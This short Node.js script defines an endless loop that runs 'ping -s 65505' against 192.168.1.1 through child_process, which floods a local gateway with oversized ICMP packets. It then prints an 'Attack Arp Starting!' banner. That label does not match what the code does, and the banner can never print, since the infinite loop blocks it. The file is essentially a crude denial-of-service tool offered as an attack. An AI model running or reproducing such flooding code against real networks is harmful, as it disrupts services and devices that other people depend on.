import { exec }from 'child_process'
import gradient from 'gradient-string'
function ok(){
  while(true){
	exec('ping -s 65505 192.168.1.1');
  }
} ok();

console.log(gradient(['blue','red'])('     Attack Arp Starting!'))
